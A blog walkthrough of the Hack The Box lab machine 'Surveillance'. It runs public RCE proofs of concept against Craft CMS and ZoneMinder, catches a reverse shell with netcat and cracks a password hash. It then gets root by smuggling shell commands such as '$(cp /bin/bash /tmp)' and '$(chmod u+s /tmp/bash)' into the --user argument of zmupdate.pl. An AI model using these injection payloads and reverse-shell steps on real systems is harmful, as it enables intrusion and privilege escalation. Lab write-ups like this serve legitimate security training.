---
layout: post
title: Hack The Box Walkthrough - Surveillance
date: 2024-03-02
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
- Machine
permalink: /2024/03/HTB/Surveillance
img: 2024/03/Surveillance/Surveillance.png
---

In Surveillance, I exploited two known vulnerabilities in web applications, cracked a password, and exploited a Perl script to become root.

* Room: Surveillance
* Difficulty: {{ page.tags[3] }}
* URL: [https://app.hackthebox.com/machines/Surveillance](https://app.hackthebox.com/machines/Surveillance)
* Authors:
  * [TheCyberGeek](https://app.hackthebox.com/users/114053)
  * [TRX](https://app.hackthebox.com/users/31190)

## Enumeration

As always, I started attacking the machine by scanning for open ports.

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.20.4:22
Open 10.129.20.4:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-11 09:46 EST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:46
Completed NSE at 09:46, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.

...

Scanned at 2024-02-11 09:46:52 EST for 13s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN+/g3FqMmVlkT3XCSMH/JtvGJDW3+PBxqJ+pURQey6GMjs7abbrEOCcVugczanWj1WNU5jsaYzlkCEZHlsHLvk=
|   256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIm6HJTYy2teiiP6uZoSCHhsWHN+z3SVL/21fy6cZWZi
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://surveillance.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:47
Completed NSE at 09:47, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:47
Completed NSE at 09:47, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:47
Completed NSE at 09:47, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.27 seconds
```

Two ports were open:
* 22 (SSH)
* 80 (HTTP)

The web server was redirecting to 'surveillance.htb'. I added that to my hosts file and scanned for subdomains. I also scanned for UDP ports it did not find anything interesting.

## Website

I opened a browser and navigated to the website on port 80.

![Website](/assets/images/2024/03/Surveillance/Website.png "Website")

I ran Feroxbuster to check for hidden pages on the site.

```bash
$ feroxbuster -u http://surveillance.htb -o ferox.txt -C 503,404,502

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://surveillance.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 💢  Status Code Filters   │ [503, 404, 502]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox.txt
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       63l      222w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       12w      178c http://surveillance.htb/images => http://surveillance.htb/images/
301      GET        7l       12w      178c http://surveillance.htb/css => http://surveillance.htb/css/
302      GET        0l        0w        0c http://surveillance.htb/admin => http://surveillance.htb/admin/login
301      GET        7l       12w      178c http://surveillance.htb/js => http://surveillance.htb/js/
200      GET        1l        0w        1c http://surveillance.htb/index
200      GET       56l      237w    22629c http://surveillance.htb/images/w3.png
200      GET      195l      842w    69222c http://surveillance.htb/images/w1.png
200      GET       46l       97w     1008c http://surveillance.htb/js/custom.js
200      GET      108l      201w     1870c http://surveillance.htb/css/responsive.css
301      GET        7l       12w      178c http://surveillance.htb/img => http://surveillance.htb/img/
302      GET        0l        0w        0c http://surveillance.htb/logout => http://surveillance.htb/
200      GET       42l      310w    32876c http://surveillance.htb/images/home.png
200      GET      114l      552w    42779c http://surveillance.htb/images/s2.png
200      GET        4l       66w    31000c http://surveillance.htb/css/font-awesome.min.css
200      GET      913l     1800w    17439c http://surveillance.htb/css/style.css
200      GET       42l      310w    32876c http://surveillance.htb/images/favicon.png
200      GET       42l      243w    24617c http://surveillance.htb/images/s3.png
200      GET      148l      770w    71008c http://surveillance.htb/images/c2.jpg
200      GET      105l      782w    62695c http://surveillance.htb/images/w2.png
200      GET      109l      602w    50641c http://surveillance.htb/images/s1.png
200      GET      238l     1140w    90858c http://surveillance.htb/images/c1.jpg
200      GET       89l      964w    72118c http://surveillance.htb/images/hero-bg.png
200      GET     4436l    10973w   136569c http://surveillance.htb/js/bootstrap.js
200      GET        2l     1276w    88145c http://surveillance.htb/js/jquery-3.4.1.min.js
200      GET      783l     4077w   330169c http://surveillance.htb/images/about-img.png
200      GET      764l     3911w   284781c http://surveillance.htb/images/why-bg.jpg
200      GET    10038l    19587w   192348c http://surveillance.htb/css/bootstrap.css
200      GET     1518l     8174w   619758c http://surveillance.htb/images/slider-img.png
200      GET      475l     1185w    16230c http://surveillance.htb/
301      GET        7l       12w      178c http://surveillance.htb/fonts => http://surveillance.htb/fonts/
403      GET        7l       10w      162c http://surveillance.htb/images/
403      GET        7l       10w      162c http://surveillance.htb/css/
403      GET        7l       10w      162c http://surveillance.htb/js/
403      GET        7l       10w      162c http://surveillance.htb/img/
200      GET        9l       26w      304c http://surveillance.htb/.htaccess
[>-------------------] - 3m     26448/717633  74m     found:35      errors:5275
[>-------------------] - 3m      4530/119601  27/s    http://surveillance.htb/
[>-------------------] - 3m      4221/119601  25/s    http://surveillance.htb/images/
[>-------------------] - 3m      4473/119601  27/s    http://surveillance.htb/css/
[>-------------------] - 3m      4615/119601  27/s    http://surveillance.htb/js/
[>-------------------] - 3m      4433/119601  26/s    http://surveillance.htb/img/
[>-------------------] - 2m      4108/119601  30/s    http://surveillance.htb/fonts/
```

It found the login page for an admin section.

![Login](/assets/images/2024/03/Surveillance/LoginCraftCMS.png "Login")

The login page and the main page showed that the site was built with [Craft CMS](https://craftcms.com/). The 'Powered by' link at the bottom of the main page showed a [link to the version](https://github.com/craftcms/cms/tree/4.4.14) it was running on.

![Powered By](/assets/images/2024/03/Surveillance/PoweredBy.png "Powered By")

I quickly found a [blog post](https://blog.calif.io/p/craftcms-rce) about a known vulnerability in the CMS. The vulnerability allowed creating arbitrary objects on the server. It used that with Imagick to write a file containing a reverse shell to the server and access it. I found a [POC](https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226) that exploited that vulnerability.


```bash
$ python poc.py http://surveillance.htb/
[-] Get temporary folder and document root ...
[-] Write payload to temporary file ...
[-] Trigger imagick to write shell ...
[-] Done, enjoy the shell
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## User matthew

Once connected to the server, I solidified my shell and looked for ways to escalate. The `.env` file contained database credentials.

```bash
www-data@surveillance:~/html/craft$ cat .env
# Read about configuration, here:
# https://craftcms.com/docs/4.x/config/

# The application ID used to to uniquely store session and cache data, mutex locks, and more
CRAFT_APP_ID=CraftCMS--070c5b0b-ee27-4e50-acdf-0436a93ca4c7

# The environment Craft is currently running in (dev, staging, production, etc.)
CRAFT_ENVIRONMENT=production

# The secure key Craft will use for hashing and encrypting data
CRAFT_SECURITY_KEY=2HfILL3OAEe5X0jzYOVY5i7uUizKmB2_

# Database connection settings
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=craftdb
CRAFT_DB_USER=craftuser
CRAFT_DB_PASSWORD=REDACTED
CRAFT_DB_SCHEMA=
CRAFT_DB_TABLE_PREFIX=

# General settings (see config/general.php)
DEV_MODE=false
ALLOW_ADMIN_CHANGES=false
DISALLOW_ROBOTS=false

PRIMARY_SITE_URL=http://surveillance.htb/
```

I used those to connect to MySQL and look at what the DB contained.

```sql
www-data@surveillance:~/html/craft$ mysql -ucraftuser -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 87
Server version: 10.6.12-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> Show Databases;
+--------------------+
| Database           |
+--------------------+
| craftdb            |
| information_schema |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [(none)]> use craftdb
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed

MariaDB [craftdb]> Show Tables;
+----------------------------+
| Tables_in_craftdb          |
+----------------------------+
| addresses                  |
| announcements              |
| assetindexdata             |
...
| userpreferences            |
| users                      |
| volumefolders              |
| volumes                    |
| widgets                    |
+----------------------------+
63 rows in set (0.001 sec)

MariaDB [craftdb]> Select * From users;
+----+---------+--------+---------+--------+-----------+-------+----------+-----------+-----------+----------+------------------------+--------------------------------------------------------------+---------------------+--------------------+-------------------------+-------------------+----------------------+-------------+--------------+------------------+----------------------------+-----------------+-----------------------+------------------------+---------------------+---------------------+
| id | photoId | active | pending | locked | suspended | admin | username | fullName  | firstName | lastName | email                  | password                                                     | lastLoginDate       | lastLoginAttemptIp | invalidLoginWindowStart | invalidLoginCount | lastInvalidLoginDate | lockoutDate | hasDashboard | verificationCode | verificationCodeIssuedDate | unverifiedEmail | passwordResetRequired | lastPasswordChangeDate | dateCreated         | dateUpdated         |
+----+---------+--------+---------+--------+-----------+-------+----------+-----------+-----------+----------+------------------------+--------------------------------------------------------------+---------------------+--------------------+-------------------------+-------------------+----------------------+-------------+--------------+------------------+----------------------------+-----------------+-----------------------+------------------------+---------------------+---------------------+
|  1 |    NULL |      1 |       0 |      0 |         0 |     1 | admin    | Matthew B | Matthew   | B        | admin@surveillance.htb | $2y$13$FoVGcLXXNe81B6x9bKry9OzGSSIYL7/ObcmQ0CXtgw.EpuNcx8tGe | 2023-10-17 20:42:03 | NULL               | NULL                    |              NULL | 2023-10-17 20:38:18  | NULL        |            1 | NULL             | NULL                       | NULL            |                     0 | 2023-10-17 20:38:29    | 2023-10-11 17:57:16 | 2023-10-17 20:42:03 |
+----+---------+--------+---------+--------+-----------+-------+----------+-----------+-----------+----------+------------------------+--------------------------------------------------------------+---------------------+--------------------+-------------------------+-------------------+----------------------+-------------+--------------+------------------+----------------------------+-----------------+-----------------------+------------------------+---------------------+---------------------+
1 row in set (0.001 sec)

MariaDB [craftdb]>
```

I found a hashed password. I tried to crack it with hashcat.

While hashcat was running, I kept looking around the server for other options. I found a backup of the database. I copied the backup in the webroot and downloaded it to my machine.

```bash
www-data@surveillance:~/html/craft$ ls storage/backups/
surveillance--2023-10-17-202801--v4.4.14.sql.zip

www-data@surveillance:~/html/craft$ cp storage/backups/surveillance--2023-10-17-202801--v4.4.14.sql.zip web/backup.sql.zip
```

I looked inside the backup and found a different hash for the same user.

```sql
LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
set autocommit=0;
INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','admin@surveillance.htb','39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec','2023-10-17 20:22:34',NULL,NULL,NULL,'2023-10-11 18:58:57',NULL,1,NULL,NULL,NULL,0,'2023-10-17 20:27:46','2023-10-11 17:57:16','2023-10-17 20:27:46');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
commit;
```

I stopped hashcat, it had been running for a while on the first hash with no success. I relaunched it on the second hash.

```bash
$ hashcat -a0 -m1400 hash2.txt /usr/share/seclists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 7 PRO 5850U with Radeon Graphics, 6849/13763 MB (2048 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/seclists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec:REDACTED

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1400 (SHA2-256)
Hash.Target......: 39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c...5770ec
Time.Started.....: Sun Feb 11 11:46:32 2024 (1 sec)
Time.Estimated...: Sun Feb 11 11:46:33 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3911.8 kH/s (0.70ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 3557376/14344384 (24.80%)
Rejected.........: 0/3557376 (0.00%)
Restore.Point....: 3551232/14344384 (24.76%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: starfish76 -> stahlmaus55
Hardware.Mon.#1..: Util: 19%

Started: Sun Feb 11 11:46:18 2024
Stopped: Sun Feb 11 11:46:34 2024
```

This time, it found a password quickly. I used it to reconnect to the server and read the user flag.

```bash
$ ssh matthew@target
The authenticity of host 'target (10.129.19.160)' can't be established.
ED25519 key fingerprint is SHA256:Q8HdGZ3q/X62r8EukPF0ARSaCd+8gEhEJ10xotOsBBE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'target' (ED25519) to the list of known hosts.
matthew@target's password:
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Feb 11 04:48:29 PM UTC 2024

  System load:  0.0               Processes:             227
  Usage of /:   83.9% of 5.91GB   Users logged in:       0
  Memory usage: 12%               IPv4 address for eth0: 10.129.19.160
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Dec  5 12:43:54 2023 from 10.10.14.40

matthew@surveillance:~$ ls
user.txt

matthew@surveillance:~$ cat user.txt
REDACTED
```

## User zoneminder

Once connected as a user, I looked around for the habitual elevation paths.

```
matthew@surveillance:~$ sudo -l
[sudo] password for matthew:
Sorry, user matthew may not run sudo on surveillance.

matthew@surveillance:~$ find / -perm /u=s 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/su
/usr/bin/fusermount3
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/umount
/usr/bin/mount
/usr/bin/newgrp

matthew@surveillance:~$ getcap -R / 2>/dev/null
```

I could not run anything with sudo, there were not suspicious suid file, and no file with dangerous capabilities. I did not find any cronjobs, and running `pspy` did not find anything I could use.

I looked to see if the server was listening to any additional ports.

```bash
matthew@surveillance:~$ ss -tunl
Netid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                      Peer Address:Port                   Process
udp                     UNCONN                   0                        0                                          127.0.0.53%lo:53                                             0.0.0.0:*
udp                     UNCONN                   0                        0                                                0.0.0.0:68                                             0.0.0.0:*
tcp                     LISTEN                   0                        80                                             127.0.0.1:3306                                           0.0.0.0:*
tcp                     LISTEN                   0                        511                                            127.0.0.1:8080                                           0.0.0.0:*
tcp                     LISTEN                   0                        511                                              0.0.0.0:80                                             0.0.0.0:*
tcp                     LISTEN                   0                        4096                                       127.0.0.53%lo:53                                             0.0.0.0:*
tcp                     LISTEN                   0                        128                                              0.0.0.0:22                                             0.0.0.0:*
tcp                     LISTEN                   0                        128                                                 [::]:22                                                [::]:*
```

Port 8080 was open on localhost. I created an SSH tunnel and looked at it in a browser.

```bash
$ ssh -L 8081:localhost:8080 matthew@target
matthew@target's password:
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)

 * Documentation:  https://help.ubuntu.com
...
```

![ZoneMinder](/assets/images/2024/03/Surveillance/ZoneMinderLogin.png "ZoneMinder")

It was running [ZoneMinder](https://zoneminder.com/), an application to manage video surveillance. I quickly found an [unauthenticated RCE](https://github.com/rvizx/CVE-2023-26035). The application code to create snapshots does not check authentication and uses the ID that is passed on the command line without sanitizing it.

I took the POC and ran it.

```bash
$ python poc2.py -t http://localhost:8081 -ip 10.10.14.65 -p4444
[>] fetching csrt token
[>] recieved the token: key:adeb7810434e6dba6f372059ed0f158e60afb5b3,1707671069
[>] executing...
[>] sending payload..
```

It gave me a shell as the user zoneminder.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.65] from (UNKNOWN) [10.129.19.160] 45718
bash: cannot set terminal process group (1005): Inappropriate ioctl for device
bash: no job control in this shell
zoneminder@surveillance:/usr/share/zoneminder/www$
```

I copied my SSH key to the server.

```bash
zoneminder@surveillance:/usr/share/zoneminder/www$ cd ~
cd ~

zoneminder@surveillance:~$ ls -la
ls -la
total 20
drwxr-x--- 2 zoneminder zoneminder 4096 Nov  9 12:46 .
drwxr-xr-x 4 root       root       4096 Oct 17 11:20 ..
lrwxrwxrwx 1 root       root          9 Nov  9 12:46 .bash_history -> /dev/null
-rw-r--r-- 1 zoneminder zoneminder  220 Oct 17 11:20 .bash_logout
-rw-r--r-- 1 zoneminder zoneminder 3771 Oct 17 11:20 .bashrc
-rw-r--r-- 1 zoneminder zoneminder  807 Oct 17 11:20 .profile

zoneminder@surveillance:~$ mkdir .ssh
mkdir .ssh

zoneminder@surveillance:~$ echo "ssh-rsa AAAAB3N..." > .ssh/authorized_keys
.." > .ssh/authorized_keys

zoneminder@surveillance:~$ chmod 700 .ssh
chmod 700 .ssh

zoneminder@surveillance:~$ chmod 600 .ssh/authorized_keys
chmod 600 .ssh/authorized_keys
```
And reconnected to get a better shell.

```bash
$ ssh zoneminder@target
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Feb 11 05:07:29 PM UTC 2024

  System load:  0.0380859375      Processes:             226
  Usage of /:   84.3% of 5.91GB   Users logged in:       0
  Memory usage: 19%               IPv4 address for eth0: 10.129.19.160
  Swap usage:   0%

...
```

## root

As the user zoneminder, I was able to run a bunch of Perl scripts as root.

```bash
zoneminder@surveillance:~$ sudo -l
Matching Defaults entries for zoneminder on surveillance:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User zoneminder may run the following commands on surveillance:
    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *


zoneminder@surveillance:~$ ls -ld /usr/bin/
drwxr-xr-x 2 root root 36864 Dec  5 12:34 /usr/bin/

zoneminder@surveillance:~$ ls -l /usr/bin/zm*.pl
-rwxr-xr-x 1 root root 43027 Nov 23  2022 /usr/bin/zmaudit.pl
-rwxr-xr-x 1 root root 12939 Nov 23  2022 /usr/bin/zmcamtool.pl
-rwxr-xr-x 1 root root  6043 Nov 23  2022 /usr/bin/zmcontrol.pl
-rwxr-xr-x 1 root root 26232 Nov 23  2022 /usr/bin/zmdc.pl
-rwxr-xr-x 1 root root 35206 Nov 23  2022 /usr/bin/zmfilter.pl
-rwxr-xr-x 1 root root  5640 Nov 23  2022 /usr/bin/zmonvif-probe.pl
-rwxr-xr-x 1 root root 19386 Nov 23  2022 /usr/bin/zmonvif-trigger.pl
-rwxr-xr-x 1 root root 13994 Nov 23  2022 /usr/bin/zmpkg.pl
-rwxr-xr-x 1 root root 17492 Nov 23  2022 /usr/bin/zmrecover.pl
-rwxr-xr-x 1 root root  4815 Nov 23  2022 /usr/bin/zmstats.pl
-rwxr-xr-x 1 root root  2133 Nov 23  2022 /usr/bin/zmsystemctl.pl
-rwxr-xr-x 1 root root 13111 Nov 23  2022 /usr/bin/zmtelemetry.pl
-rwxr-xr-x 1 root root  5340 Nov 23  2022 /usr/bin/zmtrack.pl
-rwxr-xr-x 1 root root 18482 Nov 23  2022 /usr/bin/zmtrigger.pl
-rwxr-xr-x 1 root root 45421 Nov 23  2022 /usr/bin/zmupdate.pl
-rwxr-xr-x 1 root root  8205 Nov 23  2022 /usr/bin/zmvideo.pl
-rwxr-xr-x 1 root root  7022 Nov 23  2022 /usr/bin/zmwatch.pl
-rwxr-xr-x 1 root root 19655 Nov 23  2022 /usr/bin/zmx10.pl
```

I was not able to create files in the folder, so I had to find a vulnerability in one of the existing scripts. A quick search did not turn out anything. I downloaded the scripts to my machine and started reviewing the code.

This took a long time as there were lots of code to read. But eventually I found one that used the username provided in a command to update the database. 

```perl
  my ( $host, $portOrSocket ) = ( $Config{ZM_DB_HOST} =~ /^([^:]+)(?::(.+))?$/ ) if $Config{ZM_DB_HOST};
  my $command = 'mysql';
  if ($super) {
    $command .= ' --defaults-file=/etc/mysql/debian.cnf';
  } elsif ($dbUser) {
    $command .= ' -u'.$dbUser;
    $command .= ' -p\''.$dbPass.'\'' if $dbPass;
  }
  if ( defined($portOrSocket) ) {
    if ( $portOrSocket =~ /^\// ) {
      $command .= ' -S'.$portOrSocket;
    } else {
      $command .= ' -h'.$host.' -P'.$portOrSocket;
    }
  } elsif ( $host ) {
    $command .= ' -h'.$host;
  }
  $command .= ' '.$Config{ZM_DB_NAME}.' < ';
  if ( $updateDir ) {
    $command .= $updateDir;
  } else {
    $command .= $Config{ZM_PATH_DATA}.'/db';
  }
  $command .= '/zm_update-'.$version.'.sql';

  print("Executing '$command'\n") if logDebugging();
  ($command) = $command =~ /(.*)/; # detaint
  my $output = qx($command);
```

The username is appended as is to the command that it will run. I tried to create a file.

```bash
zoneminder@surveillance:~$ sudo /usr/bin/zmupdate.pl --version 1 --user ' $(touch /tmp/pwn)'

Initiating database upgrade to version 1.36.32 from version 1

WARNING - You have specified an upgrade from version 1 but the database version found is 1.36.32. Is this correct?
Press enter to continue or ctrl-C to abort :

Do you wish to take a backup of your database prior to upgrading?
This may result in a large file in /tmp/zm if you have a lot of events.
Press 'y' for a backup or 'n' to continue : n

Upgrading database to version 1.36.32
Upgrading DB to 1.26.1 from 1.26.0
ERROR 1698 (28000): Access denied for user '-pZoneMinderPassword2023'@'localhost'
Output:
Command 'mysql -u $(touch /tmp/pwn) -p'ZoneMinderPassword2023' -hlocalhost zm < /usr/share/zoneminder/db/zm_update-1.26.1.sql' exited with status: 1

zoneminder@surveillance:~$ ls -ltrh /tmp/
total 36K
drwxr-xr-x 2 www-data www-data 4.0K Feb 11 16:04 zm
drwx------ 3 root     root     4.0K Feb 11 16:04 systemd-private-c1b27cb3bb8e4a2aa1c7d5d9a160c8d1-systemd-resolved.service-N28xDa
drwx------ 3 root     root     4.0K Feb 11 16:04 systemd-private-c1b27cb3bb8e4a2aa1c7d5d9a160c8d1-systemd-timesyncd.service-OsTsPp
drwx------ 3 root     root     4.0K Feb 11 16:04 systemd-private-c1b27cb3bb8e4a2aa1c7d5d9a160c8d1-systemd-logind.service-0fodFc
drwx------ 3 root     root     4.0K Feb 11 16:04 systemd-private-c1b27cb3bb8e4a2aa1c7d5d9a160c8d1-ModemManager.service-ce7X0W
drwx------ 2 root     root     4.0K Feb 11 16:05 vmware-root_771-4256545187
-rw------- 1 www-data www-data  229 Feb 11 16:16 phpB9NLwU
-rw------- 1 www-data www-data  229 Feb 11 16:27 phpDYi3Ey
-rw------- 1 www-data www-data  229 Feb 11 16:30 phpESQoFi
-rw-r--r-- 1 root     root        0 Feb 11 19:26 pwn
```

The command fails because the user I provided is not valid, but the file was created as root.

I used the vulnerability to copy bash in '/tmp/' and make it suid.

```bash
zoneminder@surveillance:~$ sudo /usr/bin/zmupdate.pl --version 1 --user ' $(cp /bin/bash /tmp)'

Initiating database upgrade to version 1.36.32 from version 1

WARNING - You have specified an upgrade from version 1 but the database version found is 1.36.32. Is this correct?
Press enter to continue or ctrl-C to abort :

Do you wish to take a backup of your database prior to upgrading?
This may result in a large file in /tmp/zm if you have a lot of events.
Press 'y' for a backup or 'n' to continue : n

Upgrading database to version 1.36.32
Upgrading DB to 1.26.1 from 1.26.0
ERROR 1698 (28000): Access denied for user '-pZoneMinderPassword2023'@'localhost'
Output:
Command 'mysql -u $(cp /bin/bash /tmp) -p'ZoneMinderPassword2023' -hlocalhost zm < /usr/share/zoneminder/db/zm_update-1.26.1.sql' exited with status: 1


zoneminder@surveillance:~$ sudo /usr/bin/zmupdate.pl --version 1 --user ' $(chmod u+s /tmp/bash)'

Initiating database upgrade to version 1.36.32 from version 1

WARNING - You have specified an upgrade from version 1 but the database version found is 1.36.32. Is this correct?
Press enter to continue or ctrl-C to abort :

Do you wish to take a backup of your database prior to upgrading?
This may result in a large file in /tmp/zm if you have a lot of events.
Press 'y' for a backup or 'n' to continue : n

Upgrading database to version 1.36.32
Upgrading DB to 1.26.1 from 1.26.0
ERROR 1698 (28000): Access denied for user '-pZoneMinderPassword2023'@'localhost'
Output:
Command 'mysql -u $(chmod u+s /tmp/bash) -p'ZoneMinderPassword2023' -hlocalhost zm < /usr/share/zoneminder/db/zm_update-1.26.1.sql' exited with status: 1

zoneminder@surveillance:~$ ls -ltrh /tmp/
total 1.4M
drwxr-xr-x 2 www-data www-data 4.0K Feb 11 16:04 zm
drwx------ 3 root     root     4.0K Feb 11 16:04 systemd-private-c1b27cb3bb8e4a2aa1c7d5d9a160c8d1-systemd-resolved.service-N28xDa
drwx------ 3 root     root     4.0K Feb 11 16:04 systemd-private-c1b27cb3bb8e4a2aa1c7d5d9a160c8d1-systemd-timesyncd.service-OsTsPp
drwx------ 3 root     root     4.0K Feb 11 16:04 systemd-private-c1b27cb3bb8e4a2aa1c7d5d9a160c8d1-systemd-logind.service-0fodFc
drwx------ 3 root     root     4.0K Feb 11 16:04 systemd-private-c1b27cb3bb8e4a2aa1c7d5d9a160c8d1-ModemManager.service-ce7X0W
drwx------ 2 root     root     4.0K Feb 11 16:05 vmware-root_771-4256545187
-rw------- 1 www-data www-data  229 Feb 11 16:16 phpB9NLwU
-rw------- 1 www-data www-data  229 Feb 11 16:27 phpDYi3Ey
-rw------- 1 www-data www-data  229 Feb 11 16:30 phpESQoFi
-rw-r--r-- 1 root     root        0 Feb 11 19:26 pwn
-rwsr-xr-x 1 root     root     1.4M Feb 11 19:27 bash
```

I could then run the copied version of bash to become root and read the flag.

```bash
zoneminder@surveillance:~$ /tmp/bash -p

bash-5.1# cat /root/root.txt
REDACTED
```